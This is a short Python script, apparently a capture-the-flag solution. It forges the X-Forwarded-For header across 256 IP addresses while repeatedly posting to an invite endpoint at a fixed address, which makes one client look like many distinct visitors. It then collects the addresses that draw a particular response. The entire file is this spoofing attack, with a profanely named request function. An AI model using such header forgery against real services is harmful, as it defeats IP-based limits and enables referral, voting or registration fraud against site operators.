from time import sleep
import requests as req


def fuck_ip(ip_addr):
    return req.post(
        "http://202.38.93.111:10888/invite/bf620d77-6562-4179-863b-a3901ff6b5b9",
        data={'ip': ip_addr},
        headers={
            'X-Forwarded-For': ip_addr
        }
    )


if __name__ == '__main__':
    rip = set()
    for i in range(0, 256):
        ip = f'{i}.0.0.0'
        ret = fuck_ip(ip).text
        if '快' in ret:
            rip.add(ip)
        print(ret)
        sleep(1.5)
    print(rip)
